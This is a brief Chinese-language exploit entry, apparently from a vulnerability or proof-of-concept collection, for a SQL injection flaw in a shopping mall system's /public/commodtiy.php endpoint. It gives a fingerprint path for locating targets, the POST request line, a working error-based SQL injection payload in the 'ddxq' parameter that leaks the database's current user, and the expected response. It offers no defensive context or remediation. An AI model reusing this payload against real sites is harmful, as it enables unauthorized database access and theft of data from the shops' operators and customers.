# 购物商城系统commodtiy存在任意SQL注入漏洞

购物商城系统 ｜ SQL注入 ｜ —
- **指纹**：`"/public/gwc.php"`
- **请求**：`POST /public/commodtiy.php HTTP/1.1`

**Payload**
```
ddxq='(SELECT 0x4776756d WHERE 3443=3443 AND (SELECT 9303 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))'
```
- **响应特征**：200